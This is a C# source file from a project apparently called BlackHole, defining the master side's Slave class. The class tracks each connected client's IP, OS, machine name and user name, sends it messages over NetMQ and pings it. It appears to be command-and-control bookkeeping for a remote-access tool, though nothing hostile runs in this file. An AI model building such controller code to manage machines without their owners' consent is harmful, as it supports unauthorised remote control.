using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master
{

    /// <summary>
    /// 
    /// </summary>
    public enum SlaveEventType : int
    {
        CONNECTED,
        DISCONNECTED,
        INCOMMING_MESSAGE,
    }

    /// <summary>
    /// 
    /// </summary>
    public class SlaveEvent : Event<Slave>
    {
        public SlaveEvent(SlaveEventType eventType, Slave slave, object data = null)
            : base((int)eventType, slave, data)
        {
        }
    }

    /// <summary>
    /// 
    /// </summary>
    public sealed class Slave
    {
        /// <summary>
        /// 
        /// </summary>
        public static EventBus<SlaveEvent, Slave> SlaveEvents => Singleton<EventBus<SlaveEvent, Slave>>.Instance;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public static void PostEvent(SlaveEvent ev) => SlaveEvents.PostEvent(ev);
        
        /// <summary>
        /// 
        /// </summary>
        public byte[] Identity
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public int Id
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string Ip
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string OperatingSystem
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string MachineName
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string UserName
        {
            get;
            private set;
        }
        
        /// <summary>
        /// 
        /// </summary>
        public int PingTimeout
        {
            get;
            set;
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        public Slave(byte[] identity, int id)
        {
            Identity = identity;
            Id = id;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="os"></param>
        /// <param name="machine"></param>
        /// <param name="user"></param>
        public void Initialize(string ip, string os, string machine, string user)
        {
            Ip = ip;
            OperatingSystem = os;
            MachineName = machine;
            UserName = user;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public bool Send(NetMessage message)
        {
            var frames = new NetMQMessage();
            frames.Append(Identity);
            frames.Append(message.Serialize());
            return NetworkService.Instance.Send(frames);
        }

        /// <summary>
        /// 
        /// </summary>
        public bool PingAndIncrementTimeout()
        {
            PingTimeout++;
            return Send(new PingMessage());
        }

        /// <summary>
        /// 
        /// </summary>
        public void DecrementPingTimeout()
        {
            PingTimeout--;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public override string ToString()
        {
            return $"ip={Ip} id={Id} machine={MachineName} user={UserName} os={OperatingSystem}";
        }
    }
}
